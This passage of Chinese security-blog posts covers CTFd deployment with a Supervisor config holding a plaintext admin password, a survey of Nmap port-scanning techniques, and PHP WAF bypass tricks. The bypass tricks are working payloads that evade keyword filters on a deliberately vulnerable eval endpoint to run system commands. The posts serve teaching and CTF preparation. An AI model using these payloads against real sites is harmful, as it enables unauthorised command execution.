db.session.query( Teams.id.label('teamid'), Teams.name.label('name'), Teams.school.label('school'), sumscores.columns.score )\\ .join(sumscores, Teams.id == sumscores.columns.teamid) \\ .filter(Teams.banned == False) \\ .order_by(sumscores.columns.score.desc(), sumscores.columns.id)这样scoreboard基本就改完了。接着我们再去管理员的Teams界面加入学校名方便查队伍的时候知道是哪个学校的。同样，先改CTFd/themes/admin/templates/teams.html 12345&lt;td class=\"team-id\" value=\"{{ team.id }}\"&gt;{{ team.id }}&lt;/td&gt;&lt;td class=\"team-name\" value=\"{{ team.name }}\"&gt;&lt;a href=\"{{ request.script_root }}/admin/team/{{ team.id }}\"&gt;{{ team.name | truncate(32) }}&lt;/a&gt;&lt;/td&gt;&lt;td class=\"team-email d-none d-md-table-cell d-lg-table-cell\" value=\"{{ team.email }}\"&gt;{{ team.email | truncate(32) }}&lt;/td&gt;&lt;td class=\"team-id d-md-table-cell d-lg-table-cell\" value=\"{{ team.school }}\"&gt;{{ team.school }}&lt;/td&gt;这样基本就完成了，接下来我们修改首页，直接配置好之后去Admin面板通过编辑Pages来操作会更加方便。（一开始我直接在views.py中修改index，这个是要被写进数据库的pages中的，我一边改一边update数据库，现在想起来简直蠢爆。 到这里我们自定义CTFd基本就完成了。（有些功能仍然还会报错，例如导出比赛功能，因为Teams多了一个字段school，所以很大一部分其他报错，虽然目前我只遇到这个功能会报错，基本都是因为自定义增加了这个字段导致的，去看看源码把相应缺少的加上基本就能解决了。 Enviroment本次采用的配置是使用nginx、mysql、uwsgi来配置ctfd，配置环境在ubuntu serve 18.04下，安装过程就不提了。网上教程很多。 这里说一下nginx的配置：12345678server&nbsp; { listen 80; server_name Your domain; location / { include uwsgi_params; uwsgi_pass unix:/tmp/uwsgi.sock; }}然后需要把CTFd连接数据库的方法改成mysql，我们可以看到CTFd/config.py中12DATABASE_URL = os.environ.get( 'DATABASE_URL') or 'sqlite:///{}/ctfd.db'.format(os.path.dirname(os.path.abspath(__file__)))所以我们需要在环境中定义DATABASE_URL，参考它给出的格式1e.g. mysql+pymysql://root:&lt;YOUR_PASSWORD_HERE&gt;@localhost/ctfd但是我们最好不要用root使用mysql，而且如果我当时用root用户的话，直接报错了1ERROR 1698 (28000): Access denied for user 'root'@'localhost'参考MySQL ERROR 1698 (28000) 错误，是因为我的root用户的plugin没有配置好，而且用root用户连接mysql不太安全，所以我们这里创建了一个ctfd的数据库用户，并给予它ctfd数据库的所有权力。1234567CREATE USER 'ctfd'@'localhost' IDENTIFIED BY 'Your password'; //创建用户select user, plugin from mysql.user; //查看当前所有数据库用户的pluginupdate mysql.user set plugin='mysql_native_password' where user='ctfd'; //更改ctfd用户的plugin，可以使用密码登录ctfd用户GRANT ALL ON ctfd.* TO 'ctfd'@'localhost'; //给予ctfd用户ctfd数据库的权力 虽然我们可以直接在bash中1export DATABASE_URL=mysql+pymysql://ctfd:Your password@localhost/ctfd但是这样不太优雅，我们可以新建一个uwsgi.ini中写入1234567[uwsgi]# Where you've put CTFDchdir = /your/dir/CTFdenv = \"DATABASE_URL=mysql+pymysql://ctfd:Your password@localhost/ctfd\"这样会比较好。这样，连接数据库的操作就基本完成了。 然后为了方便运维，可以使用Supervisor对uwsgi进行管理操作。贴一下当时的配置文件1234567891011121314151617181920212223242526272829303132333435363738394041424344454647[unix_http_server]file = /var/run/supervisor.sock;chmod=0700 ; socket file mode (default 0700);chown=nobody:nogroup ; socket file uid:gid owner;username=user ; (default is no username (open server));password=123 ; (default is no password (open server))[inet_http_server] ; inet (TCP) server disabled by defaultport=9001 ; (ip_address:port specifier, *:port for ;all iface)username=admin ; (default is no username (open server))password=suctf_new_2018 ; (default is no password (open server))[supervisord];logfile=/tmp/supervisord.log ; (main log file;default $CWD/supervisord.log);修改为 /var/log 目录，避免被系统删除logfile=/var/log/supervisord/supervisord.log ; (main log file;default $CWD/supervisord.log); 日志文件多大时进行分割logfile_maxbytes=50MB ; (max main logfile bytes b4 rotation;default 50MB); 最多保留多少份日志文件logfile_backups=10 ; (num of main logfile rotation backups;default 10)loglevel=info ; (log level;default info; others: debug,warn,trace)pidfile=/var/run/supervisord.pid ; (supervisord pidfile;default supervisord.pid);设置启动supervisord的用户，一般情况下不要轻易用root用户来启动，除非你真的确定要这么做;user=chrism ; (default is current user, required if root)minfds=1024 ; (min. avail startup file descriptors;default 1024)minprocs=200 ; (min. avail process descriptors;default 200)childlogdir=/var/log/supervisord/ ; ('AUTO' child log dir, default $TEMP)[supervisorctl]; 必须和'unix_http_server'里面的设定匹配;serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket;修改为 /home/supervisor 目录，避免被系统删除serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socketusername=admin ; should be same as http_username if setpassword=suctf_new_2018 ; should be same as http_password if set[program:uwsgi]command=uwsgi -s /tmp/uwsgi.sock --chmod-socket=666 -w 'CTFd:create_app()'directory=/xxx/CTFdautostart = truestartsecs = 5redirect_stderr = true;这对这个program的log的配置，上面的logfile_maxbytes是supervisord本身的log配置stdout_logfile_maxbytes = 20MBstdoiut_logfile_backups = 20stdout_logfile = /var/log/supervisord/uwsgi.log 具体可以参考：Python 进程管理工具 Supervisor 使用教程用Supervisord管理Python进程Python 进程管理工具 Supervisor 使用教程【已解决】supervisor去启动gunicorn的Flask出错：supervisor couldn’t setuid to 0 Can’t drop privilege as nonroot user 最后白师傅通过做成了系统服务来管理的uwsgi，这里留到NUAACTF再来更吧。 PS:今天中午12：28刚刚发现CTFd更新到了2.0，可能稍有不同。后续做完NUAACTF我会再更一下。","link":"/2018/11/20/SUCTF%E5%B0%8F%E8%AE%B0/"},{"title":"浅谈端口扫描技术","text":"最近要写个端口扫描器，学习整理了一下目前的端口扫描器技术。 文章首发于先知社区：https://xz.aliyun.com/t/5376 按照目前的协议类型，我们大致可以知道有： ​ 一个IP地址可以有65535(2^16)个端口，范围则是从0到65535(2^16-1)，每个端口按照协议又可以分为两种类型：一种是TCP端口；另一种是UDP端口。 ​ TCP、UDP都是IP层的传输协议，其中TCP是面向连接、可靠的字节流服务；UDP则是不可靠的，面向数据报的服务。每一个端口都会支持这两种协议，因此可以基于这两种协议进行端口扫描。 以及现在还有通过在 TCP/IP 模型中的网络层 ICMP 协议来探测端口的扫描技术。 TCPTCP报文这里就不再细讲了，也不是重点，放一张TCP数据报文的图，具体可以去百度百科了解： TCP三次握手： TCP CONNECT SCAN原理很简单，与目标端口建立3次握手，如果成功建立则为open，收到RST则为close usageMSF 模块： 1use auxiliary/scanner/portscan/tcp Nmap 选项参数： 1nmap -sT scanme.nmap.org TCP SYN SCAN也称为TCP半连接扫描，只发送三次握手的第一次SYN报文段，如果收到ACK+SYN则为open，收到RST则为close，这种好处是不必等待三次握手完全完成，速度快且不容易被防火墙记录进日志。 Nmap 处理方式： Probe Response Assigned State TCP SYN/ACK response open TCP RST response closed No response received (even after retransmissions) filtered ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered usageMSF 模块： 1use auxiliary/scanner/portscan/syn Nmap 参数 1nmap -sS scanme.nmap.org TCP Xmas Tree SCAN客户端向服务端发送带有 PSH，FIN，URG 标识的数据包(即不含有ACK SYN RST)，被称为TCP Xmas Tree扫描。其利用的是RFC的规定: ​ 如果不设置SYN，RST，或者ACK位的报文发送到开放端口，理论上，这不应该发生，如果您确实收到了，丢弃该报文，返回。 那么就有： ​ 如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回而当端口开放时，应该没有任何响应。只要不包含SYN，RST，或者ACK, 任何其它三种(FIN，PSH，and URG)的组合都行。 Nmap 对 NULL, FIN, or Xmas 扫描的处理： Probe Response Assigned State No response received (even after retransmissions) open or filtered TCP RST packet closed ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered usageMSF 模块： 1use auxiliary/scanner/portscan/xmas Nmap 选项参数： 1234567891011Null scan (`-sN`)Does not set any bits (TCP flag header is 0)FIN scan (`-sF`)Sets just the TCP FIN bit.Xmas scan (`-sX`)Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree. TCP NULL SCAN空扫描即flag位全 0 ，如果没有回复则为open，收到RST则为close TCP ACK SCAN使用TCP ACK扫描不能够确定端口的关闭或者开放，因为当发送给对方一个含有 ACK 表示的TCP报文的时候，都返回含有RST标志的报文，无论端口是开放或者关闭。所以，不能使用TCP ACK扫描来确定端口是否开放或者关闭。但是可以利用它来扫描防火墙的配置，用它来发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。 向服务端发送一个带有 ACK 标识的数据包，如果收到带有 RST 标识的响应，则说明服务端没有过滤，不存在状态防火墙。 usage可以使用 msf 的模块 1use auxiliary/scanner/portscan/ack Nmap 可以用以下命令 1nmap -sA scanme.nmap.org TCP WINDOW SCANTCP 窗口扫描的流程类似于 ACK 扫描，都是向服务端发送带有 ACK 标识的数据包，不同的在于 TCP 窗口扫描会检查收到的 RST 数据包中的窗口大小，如果 RST 数据包中的窗口大小不为零，则说明目标端口是开放的。 如果 RST 数据包中的窗口大小为零，则说明目标端口处于关闭状态。 Nmap 对 TCP Window 扫描的处理： Probe Response Assigned State TCP RST response with non-zero window field open TCP RST response with zero window field closed No response received (even after retransmissions) filtered ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered usageNmap 扫描参数： 1nmap -sW docsrv.caldera.com TCP Idle Scan1998年，安全研究员Antirez（曾参与编辑nmap中有关hping2工具的相关文章）在Bugtraq邮件列表中发布了一篇关于新的端口扫描技术的文章。Idle Scan，也就慢慢的为众人所了解，它允许进行完全盲目的端口扫描。事实上，攻击者可以不用向目标发送数据包就完成扫描工作！相反，用猥琐的边信道攻击是能够让扫描映射到一个Zombie 主机上的。除了极其隐蔽的情况，这种扫描方式允许挖掘机器之间基于IP的信任关系。 虽然 Idle Scan 比目前讨论的任何技术都复杂，但您无需成为TCP / IP专家就能理解它。你只需要知道这些就够了： 确定TCP端口是否打开的一种方法是向端口发送SYN（会话建立）数据包。如果端口打开，目标机器将响应SYN / ACK（会话请求确认）数据包，如果端口关闭，则响应RST（重置）。这是前面讨论的SYN扫描的基础。 接收未经请求的SYN / ACK数据包的计算机将使用RST进行响应。未经请求的RST将被忽略。 Internet上的每个IP数据包都有一个片段标识号（IP ID）。由于许多操作系统只是为它们发送的每个数据包递增此数字，因此探测IPID可以告诉攻击者自上次探测以来已发送了多少数据包。 结合以上特征，就可以伪造身份去扫描目标网络，所以看起来就像是无辜的 Zombie 主机在扫描。 Idle Scan Step by Step从本质上来看，Idle Scan 只需要重复3个步骤就ok了。 探查Zombie的IP ID并记录下来。 在Zombie主机上伪造一个包，然后把包发送给目标主机端口。根据端口的状态，目标主机可能会也有可能不会导致Zombie主机IPID值增加。 再探查Zombie主机的IP ID。比较两次得到IPID值 经过这样一个流程，Zombie主机的 IP ID 应该会增加1~2。如果只是增加了1，那么就可以说明Zombie主机还没有发出任何包，当然，响应攻击者的探查请求除外。没有发送包也就意味着目标端口没有被打开（也可能是目标主机向Zombie主机发送了一个RST包，导致请求被忽略，或者是根本就是什么都没有做）。增加的如果是2，那就表明Zombie主机成功在两个探测器之间发送了包。这种情况一般情况都意味着目标端口是开着的（目标大概会向Zombie主机发送一个SYN/ACK包去响应攻击者伪造的SYN，从Zombie主机诱导RST包）。如果是增加了一个比2还大的数字，那么就说明Zombie主机太糟糕了！它可能不能胜任预测IPID数值，也可能是正在忙于其他与Idle Scan无关的事情。 虽然关闭了端口和被过滤的端口会发生的事情稍微有点点不同，但是攻击者处理的方法都一样，IPID都只是增加1。所以，在Idel Scan中无法区别端口到底是关闭的还是已经过滤了。当Nmap记录的IPID增加了1，也就被标记成了close丨filterred。 以下三张图大略可以说明端口被打开，关闭，过滤的情况。 端口开放： 端口关闭： 端口被过滤： Idel Scan根本上来讲就是一个隐性扫描，Nmap提供了decoy scanning (-D)，帮助使用者保护自己的身份。如果不是使用的（类似Idel Scan扫描方式）仍然需要攻击者通过自身真实IP向目标发送数据包以获取扫描结果。Idel Scan扫描结果其中之一就有入侵检测系统通常会发送一个Zombie主机已经开始扫描的通知。所以它可以作为一个框架去扫描另外一个目标，当你查阅入侵检测系统（IDS）时，请记住这种可能性。 Idel Scan的一个独特优势便是，它可以绕开某些过滤防火墙和路由器。IP源地址过滤，是一种常见的（虽然很弱）用于限制机器连接到敏感主机或者说网络上的安全机制。举个例子，一个公司数据库服务器，只允许公共网络连接。或者，家庭用户只允许SSH连接到工作机上面。 Idel Scanning有时也可以被用来映射信任关系，关键在于Idel Scan最终会从Zombie主机获取开放端口列表。一个正常的扫描对于上述数据库服务器可能会显示没有端口开放，但是当将Zombie主机作为Web Sever的IP，使用Idel Scan就可能将数据库相关开放端口暴露出来。 映射出的这些信任关系就可能作为攻击者优先考虑的目标，上面所讨论的方式手法很猥琐哇！ Idel Scan有一个缺点就是它比其他一些扫描方式所花费的时间更长。尽管在《Idel Scan算法实现》章节中有对Idel Scan的优化算法，一个只需要15秒就可以完成的SYN，Idel Scan或许需要15分钟才能够完成。另一个问题就是你必须能够发送欺骗包，伪装成好像他们来自Zombie主机一般，让他们到达目标主机。许多ISP服务商（特别是拨号和住宅宽带供应商）目前执行出口过滤来防止这类数据包欺骗。高端供应商（比如说主机托管，T1-Services）就不太可能这么做。如果实际存在这个过滤，Nmap会在你尝试的每一个Zombie主机上显示一个快速错误消息。如果不能够更换ISP服务商，那么最好尝试在让ISP服务商给你更换一个IP。有时候这个过滤仅仅只是阻止了客户使用范围之外的欺骗IP地址。Idel Scan另外一个难点就是你必须寻找一个正在工作的Zombie主机。 上述描述的是Idel Scan的基础水平。在Nmap上实现却是有些复杂，最关键的差异在于Nmap能够同时执行，而且误报少。 Parallelizing idle scan由于是间接推导出端口所以，他比其他扫描方式要更加的猥琐。如果Nmap探测目标主机上的多个端口，然后检测Zombie主机上新的IP ID值，IP ID的值增加了多少就显示出目标开放了多少个端口。实际上这并不是一个和严重的问题，绝大多数端口在大型扫描结果中基本上都是被关闭或者被过滤。由于只有开放端口才可以让IP ID值增加，Nmap会认为没有增加量，然后整个组的端口就被标记成了关闭或者被过滤。Nmap可以并行扫描一百组端口。如果Nmap在探测一组端口的时候Zombie主机IP ID同时也增加了，就说明在这一组端口中一定有开放的端口。Nmap继而使用二进制搜索发现开放的端口。它将数据组分成两份，分别发送探测信息，如果一个数据组显示没有开放端口，那么这一数据组的端口都将被标记为被关闭或者被过滤。如果一个数据组显示有开放端口，那么在把这个数据组分成两份，重复以上步骤，直到最终将开放端口都找出来。虽然这种方式更复杂，但是这种方式可以节约扫描时间。 可靠性是Idel Scan的另一个问题。如果Zombie主机在扫描时向任何不相干的机器发送数据包，其IP ID会增加。这就会让Nmap误以为已经寻找到开放的端口了。幸运的是，并行扫描在这里也是有很大作用的。如果Nmap在一个组中扫描100个端口，那么IP ID就会增加标识两个开放端口，Nmap将这组数据分成50端口一个小组。当Nmap同时在两个小组中进行IP ID扫描时，Zombie主机IP ID总的增加量就在加了一次。另外，Nmap如果探测到不一致，那么它会重新探测。基于检测可靠的Zombie主机，Nmap还会修改组大小以及扫描时间。如果Nmap发现有大量不一致的结果，它将退出，并提示用户选择更好的Zombie主机。 具体操作可以参考TCP Idle Scan (-sI) TCP Maimon ScanMaimon Scan 以其发现者 Uriel Maimon 命名。 他在 Phrack 杂志第49期（1996年11月）中描述了这种技术。 除了探测器是FIN / ACK之外，此技术与NULL，FIN和Xmas扫描完全相同。 根据RFC 793（TCP），响应于这样的探测，应该生成RST分组，无论端口是打开还是关闭。 但是，如果端口打开，许多BSD派生系统只会丢弃数据包。 Nmap利用这一点来确定开放端口，如下表所示： Nmap 对 TCP Maimon Scan 的处理： Probe Response Assigned State No response received (even after retransmissions) open or filtered TCP RST packet closed ICMP unreachable error (type 3, code 1, 2, 3, 9, 10, or 13) filtered usage1234567nmap -sM paraStarting Nmap ( http://nmap.org )All 1000 scanned ports on para (192.168.10.191) are: closedMAC Address: 00:60:1D:38:32:90 (Lucent Technologies)Nmap done: 1 IP address (1 host up) scanned in 4.19 seconds TCP FTP Bounce ScanFTP协议（RFC 959）的一个有趣特性是支持代理FTP连接。这允许用户连接到一个FTP服务器，然后要求将文件发送到第三方服务器。这样的功能在很多层面上被滥用，因此大多数服务器已停止支持它。此功能允许的滥用功能之一是通过 FTP 服务器进行扫描其他主机端口。只需要求 FTP 服务器依次将文件发送到目标主机的每个端口就可以了。回显消息将描述端口是否打开。这是绕过防火墙的好方法，因为内部的 FTP 服务器通常放置在比旧的 Internet 主机都能访问到的其他主机的位置上。 Nmap支持使用-b选项进行FTP反弹扫描。它采用&lt;username&gt;:&lt;password&gt;@&lt;server&gt;:&lt;port&gt;形式的参数。 &lt;Server&gt;是易受攻击的FTP服务器的名称或IP地址。与普通URL一样，您可以省略&lt;username&gt;:&lt;password&gt;，在这种情况下，将使用匿名登录凭据（user:anonymous password:-wwwuser@）。端口号（和前面的冒号）也可以省略，在这种情况下，使用&lt;server&gt;上的默认FTP端口（21）。 使用 FTP Bounce Scan 较为频繁的用户更好地习惯了对回显消息的处理。这个漏洞在1997年Nmap发布时很普遍，但已在很大程度上得到修复。易受攻击的服务器仍然存在，所以当其他所有服务器都失败时，这个方法值得一试。如果您的目标是绕过防火墙，请扫描目标网络以查找开放的21端口（如果使用版本检测扫描所有端口，则扫描任何FTP服务），然后尝试使用每个端口进行 Bounce Scan。 Nmap会告诉您主机是否容易受到攻击。如果您只是试图掩盖您的曲目，您不需要（事实上，不应该）限制目标网络上的主机。在为易受攻击的FTP服务器扫描随机Internet地址之前，请考虑系统管理员可能不会允许这样滥用其服务器。 usageNmap 扫描方式： 1234567891011121314151617nmap -p 22,25,135 -Pn -v -b XXX.YY.111.2 scanme.nmap.orgStarting Nmap ( http://nmap.org )Attempting connection to ftp://anonymous:-wwwuser@@XXX.YY.111.2:21Connected:220 JD FTP Server ReadyLogin credentials accepted by ftp server!Initiating TCP ftp bounce scan against scanme.nmap.org (64.13.134.52)Adding open port 22/tcpAdding open port 25/tcpScanned 3 ports in 12 seconds via the Bounce scan.Nmap scan report for scanme.nmap.org (64.13.134.52)PORT STATE SERVICE22/tcp open ssh25/tcp open smtp135/tcp filtered msrpcNmap done: 1 IP address (1 host up) scanned in 21.79 seconds UDP在TCP/IP模型中，UDP为网络层以上和应用层以下提供了一个简单的接口。UDP只提供数据的不可靠传递，它一旦把应用程序发给网络层的数据发送出去，就不保留数据备份（所以UDP有时候也被认为是不可靠的数据报协议）。UDP在IP数据报的头部仅仅加入了复用和数据校验字段。 UDP适用于不需要或在程序中执行错误检查和纠正的应用，它避免了协议栈中此类处理的开销。对时间有较高要求的应用程序通常使用UDP，因为丢弃数据包比等待或重传导致延迟更可取。 UDP SCANUDP扫描比较简单，一般如果返回ICMP port unreachable说明端口是关闭的，而如果没有回应或有回应(有些UDP服务是有回应的但不常见)则认为是open，但由于UDP的不可靠性，无法判断报文段是丢了还是没有回应，所以一般扫描器会发送多次，然后根据结果再判断。这也是为什么UDP扫描这么慢的原因。 虽然因特网上最流行的服务运行在TCP协议上，但UDP服务被广泛部署。 DNS，SNMP和DHCP（注册端口53,161 / 162和67/68）是最常见的三种。 由于UDP扫描通常比TCP更慢且更困难，因此某些安全审核员会忽略这些端口。 这是一个错误，因为可利用的UDP服务非常普遍，攻击者肯定不会忽略整个协议。 UDP扫描通过向每个目标端口发送UDP数据包来工作。 对于大多数端口，此数据包将为空（无有效负载），但对于一些更常见的端口，将发送特定于协议的有效负载。 根据响应或缺少响应，端口被分配给四种状态之一，如下表所示： Nmap 对 UDP Scan 的处理： Probe Response Assigned State Any UDP response from target port (unusual) open No response received (even after retransmissions) open or filtered ICMP port unreachable error (type 3, code 3) closed Other ICMP unreachable errors (type 3, code 1, 2, 9, 10, or 13) filtered usageNmap 选项参数： 1nmap -sU scanme.nmap.org Nmap 有很多选项可以提升 UDP Scan 的准确性与速度，这里不再深入讲解，具体可以参考UDP Scan (-sU) ICMPICMP 格式： ​ 根据网络协议，如果按照协议出现了错误，那么接收端将产生一个icmp的错误报文。这些错误报文并不是主动发送的，而是由于错误，根据协议自动产生。 ICMP 相关类型解释： 一般如果数据包被防火墙过滤的话，会收到一个 ICMP 数据包，其中类型为3，代码为1，2，3，9，10或13。 ICMP SCAN常见的利用： SCTP这里我们简单介绍一下 SCTP 协议。 流控制传输协议（英语：Stream Control Transmission Protocol，缩写：SCTP）是在2000年由IETF的SIGTRAN工作组定义的一个传输层协议。RFC 4960详细地定义了SCTP，介绍性的文档是RFC 3286。 作为一个传输层协议，SCTP可以理解为和TCP及UDP相类似的。它提供的服务有点像TCP，又同时将UDP的一些优点相结合。是一种提供了可靠、高效、有序的数据传输协议。相比之下TCP是面向字节的，而SCTP是针对成帧的消息。 SCTP主要的贡献是对多重联外线路的支持，一个端点可以由多于一个 IP地址 组成，使得传输可在主机间或网卡间做到透明的网络容错备援。 SCTP最初是被设计用于在IP上传输电话协议（SS7），把 SS7 信令网络的一些可靠特性引入IP。IETF 的这方面的工作称为信令传输 SIGTRAN。 SCTP将数据传给应用层的方式，是将数据视为message（bytes的集合），SCTP的特征是message-oriented，意思就是说它发送的是一串message（每一个message是byte为单位的集合），相对于TCP是以byte为单位，发送的是破碎的流。在SCTP发送端用一个动作提交消息，接收端也是用一个动作取出消息传给对应的应用程序。相较于TCP，是一个流导向的协议，可靠地且有顺序地发送以bytes为单位的流。然而TCP并不允许接收端知道发送端的应用程序调用提交bytes集合的次数。在发送端TCP只是简单的附加更多bytes在queue里等待着送到网络上，而SCTP是将要提交的outband message都保有自己独立的queue。 简而言之，SCTP是TCP和UDP协议的一种相对较新的替代方案，它结合了TCP和UDP的大多数特性，还增加了多宿主和多流等新功能。它主要用于SS7 / SIGTRAN相关服务，但也有可能用于其他应用程序。 下图是 TCP 与 SCTP 建立连接的对比图： SCTP INIT scanSCTP INIT扫描是TCP SYN扫描的SCTP等效物。它可以快速执行，在快速网络上每秒扫描数千个端口，而不受限制性防火墙的限制。与SYN扫描一样，INIT扫描相对不显眼且隐蔽，因为它永远不会完成SCTP关联。它还允许在打开，关闭和过滤状态之间进行清晰，可靠的区分。 此技术通常称为半开扫描，因为您不打开完整的SCTP关联。您发送一个INIT块，就好像您要打开一个真正的关联，然后等待响应。 INIT-ACK块表示端口正在侦听（打开），而ABORT块表示非侦听器。如果在多次重新传输后未收到响应，则将端口标记为已过滤。如果收到ICMP不可达错误（类型3，代码0,1,2,3,9,10或13），则端口也会被标记为已过滤。 usage1nmap -sY ip SCTP COOKIE ECHO SCANSCTP COOKIE ECHO SCAN 是一种更先进的SCTP扫描。 它利用了SCTP实现应该在开放端口上静默丢弃包含COOKIE ECHO块的数据包这一事实，但如果端口关闭则发送ABORT。 这种扫描类型的优点是端口扫描不像INIT扫描那么明显。 此外，可能存在阻止INIT块的非状态防火墙规则集，但不阻止COOKIE ECHO块。 不要误以为这会使端口扫描不可见; 一个好的IDS也能够检测到SCTP COOKIE ECHO扫描。 缺点是SCTP COOKIE ECHO扫描不能区分打开和过滤的端口，在这两种情况下都会打开状态。 usage1nmap -sZ ip IPIP ScanIP协议扫描允许您确定目标计算机支持哪些IP协议（TCP，ICMP，IGMP等）。这在技术上不是端口扫描，因为它循环通过IP协议号而不是TCP或UDP端口号。然而，它仍然使用-p选项来选择扫描的协议号，以正常的端口表格式报告其结果，甚至使用与真正的端口扫描方法相同的底层扫描引擎。所以它足够接近它所属的端口扫描。 协议扫描的工作方式与UDP扫描类似。它不是遍历UDP数据包的端口号字段，而是发送IP数据包标头并迭代通过8位IP协议字段。标头通常是空的，不包含任何数据，甚至不包括所声明协议的正确标头。某些流行协议（包括TCP，UDP和ICMP）例外。包含适当的协议头，因为一些系统不会发送它们，因为Nmap已经具有创建它们的功能。协议扫描不是在观察ICMP端口不可达消息，而是在寻找ICMP协议不可达消息。如下表显示了对IP探测的响应如何映射到端口状态。 Nmap 对 IP Scan 的处理： Probe Response Assigned State Any response in any protocol from target host open (for protocol used by response, not necessarily probe protocol) ICMP protocol unreachable error (type 3, code 2) closed Other ICMP unreachable errors (type 3, code 1, 3, 9, 10, or 13) filtered (though they prove ICMP is open if sent from the target machine) No response received (even after retransmissions) open or filtered 与TCP或UDP协议中的开放端口一样，每个开放协议都是潜在的利用向量。此外，协议扫描结果有助于确定机器的用途以及采用何种类型的数据包过滤。终端主机通常只有TCP，UDP，ICMP和（有时）IGMP打开，而路由器通常提供更多，包括路由相关协议，如GRE和EGP。防火墙和VPN网关可能会显示与加密相关的协议，如IPsec和SWIPE。 与UDP扫描期间收到的ICMP端口不可达消息一样，ICMP协议不可达消息通常是速率限制的。例如，默认Linux 2.4.20框中每秒发送的ICMP目标无法访问响应不超过一个。由于只有256个可能的协议号，因此与65,536端口UDP扫描相比，这不是问题。 usage协议扫描的使用方法与命令行上的大多数其他扫描技术的使用方法相同。除了一般的Nmap选项外，请简单指定-sO。普通端口-p选项用于选择协议号。或者，您可以使用-F扫描nmap-protocols数据库中列出的所有协议。默认情况下，Nmap扫描所有256个可能的值。 123456789101112131415161718192021222324252627282930313233nmap -sO 62.233.173.90 paraStarting Nmap ( http://nmap.org )Nmap scan report for ntwklan-62-233-173-90.devs.futuro.pl (62.233.173.90)Not shown: 240 closed portsPROTOCOL STATE SERVICE1 open icmp 4 open|filtered ip 6 open tcp 8 open|filtered egp 9 open|filtered igp 17 filtered udp 47 open|filtered gre 53 filtered swipe 54 open|filtered narp 55 filtered mobile 77 filtered sun-nd 80 open|filtered iso-ip 88 open|filtered eigrp 89 open|filtered ospfigp 94 open|filtered ipip 103 filtered pim Nmap scan report for para (192.168.10.191)Not shown: 252 closed portsPROTOCOL STATE SERVICE1 open icmp 2 open|filtered igmp 6 open tcp 17 filtered udp MAC Address: 00:60:1D:38:32:90 (Lucent Technologies)Nmap done: 2 IP addresses (2 hosts up) scanned in 458.04 seconds Reference扫描器原理总结 端口扫描原理及实现 Nmap Docs- Chapter 5. Port Scanning Techniques and Algorithms","link":"/2019/06/12/Scanner/"},{"title":"Some Tricks of Bypass php waf","text":"起因是年前看了一篇How To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules，现在搜了一下发现已经有翻译了。感觉升华也没什么好扩展的，也不太好拿去投稿了，思考了一下，感觉还是当作学习笔记来写算了。 以下实现环境均在 php 7.0.31 版本上，并且把 waf 因素考虑在内。 引入首先来看一段 php 代码: 1234567&lt;?phpif(preg_match('/system|exec|passthru/',$_GET['code'])){ echo 'invalid syntax';}else { eval($_GET['code']);} 执行命令不只这几个函数，还有很多，这里就拿这几个来举例。毫无疑问，这里肯定是可以执行命令。 那我们先直接尝试读取/etc/passwd，显然，这里还没到代码层面就直接被 waf 了。 原因可能是因为/etc/passwd的敏感原因 绕过 waf那我们接下来先尝试绕过 waf ，可以尝试使用/etc/pas\\swd绕过，也可以使用其他空变量，当然方法很多 可以发现，我们是成功绕过 waf ，来到了代码层面，接下来我们就需要考虑怎么绕过命令执行函数了 PHP 转义序列在谈绕过函数过滤前，我们先了解一下 PHP 的转义序列，简单来说就是使用反斜线转义各种字符形成特定的意义。比如说： \\040 空格的另外一种用法 以八进制表示的\\[0–7]{1,3}转义字符会自动适配二进制字符（如\\377，八进制377是10进制255， 因此代表一个全1的字符） \\x[0–9A-Fa-f]{1,2} 表示十六进制转义字符表示法（如\\x41） 以Unicode表示的\\u{[0–9A-Fa-f]+}字符，会输出为UTF-8字符串 虽然看起来很普通，但是我们可以使用各种语法来表示字符串，再配合 php 可变函数来绕过各种防御 php 可变函数 ​ PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。 可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。 看一下官方示例 123456789101112131415161718192021222324&lt;?phpfunction foo() { echo \"In foo()&lt;br /&gt;\\n\";}function bar($arg = '') { echo \"In bar(); argument was '$arg'.&lt;br /&gt;\\n\";}// 使用 echo 的包装函数function echoit($string){ echo $string;}$func = 'foo';$func(); // This calls foo()$func = 'bar';$func('test'); // This calls bar()$func = 'echoit';$func('test'); // This calls echoit()?&gt; 也就是说$var(args)跟“string”(args);是与function(args)等效的。于是我们可以有 尝试\"\\x73\\x79\\x73\\x74\\x65\\x6d\"(\"whoami\") 确实可以执行无误，然后我们就可以利用这个特性绕过对system的检测了 改进输入检测上述我们的 payload 中还是用到了双引号，而大多数的时候 waf 不会允许使用双引号的，我们将 php 文件内容修改为 1234567&lt;?phpif(preg_match('/system|exec|passthru|[\\\"\\']/',$_GET['code'])){ echo 'invalid syntax';}else { eval($_GET['code']);} 增加了对单引号与双引号的检测，这时候应该怎么办呢 让我们再来看一个特性 也就是说在 PHP 中，字符串表达可以有以上这几种方法，于是我们可以用以上的方式尝试替代双引号。第一种是类似(system)(whoami);，然而在 php 中我们可以用.来拼接字符串，于是也可以有(sys.(te).m)(whoami); 也可以使用/?a=system&amp;b=ls&amp;code=$_GET[a]($_GET[b]);的解析方法来绕过 这里我们还可以使用其他技巧，比如我们可以在函数名和参数内插入注释（这种方法在绕过某些WAF规则集方面非常有用，这些规则集会拦截特定的PHP函数名 1234php -r \"echo/*this is a comment*/(foo);\"php -r \"system/*this is a comment*/(whoami);\"php -r \"system/*this is a comment*/(wh./*foo*/(oa)/*bar*/.mi);\"php -r \"(s/*foo*/.(ys)./*bar*/tem)/*this is a comment*/(wh./*foo*/(oa)/*bar*/.mi);\" get_defined_functions ​ (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7) ​ get_defined_functions — 返回所有已定义函数的数组 ​ get_defined_functions 